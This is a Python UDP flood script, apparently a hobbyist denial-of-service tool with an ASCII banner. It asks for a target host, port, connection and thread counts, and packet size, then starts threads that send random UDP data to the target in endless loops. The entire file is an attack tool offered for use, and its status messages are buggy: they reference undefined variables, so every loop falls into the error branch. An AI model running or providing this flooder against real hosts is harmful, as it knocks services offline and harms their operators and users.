import random
import socket
import threading
import os,sys

os.system("clear")
print("""\033[91m
  _____        __  __     _____
 |__  /___  ___\ \/ /   _|__  /
   / // _ \/ _ \\  / | | | / / 
  / /|  __/  __//  \ |_| |/ /_ 
 /____\___|\___/_/\_\__, /____|
                    |___/ """)

p1 = str(input("HOST/IP :"))
p2 = int(input("PORT :"))
p3 = int(input("Connection:"))
p4 = int(input("Thread :"))
p5 = int(input("URANDOM :"))
choice = str(input("Gas?(y/n) :"))
os.system("clear")
def run():
    data = random._urandom(p5)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(p1),int(p2))
            for x in range(p3):
                s.sendto(data,addr)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            print("[X] WIBU!!!")

def run2():
    data = random._urandom(p5)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.send(data)
            for x in range(p3):
                s.send(data)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            s.close()
            print("[X] WIBU!!!")

def run3():
    data = random._urandom(p5)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.send(data)
            for x in range(p3):
                s.send(data)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            s.close()
            print("[X] WIBU!!!")

for y in range(p5):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
    else:
        th = threading.Thread(target = run3)
        th.start()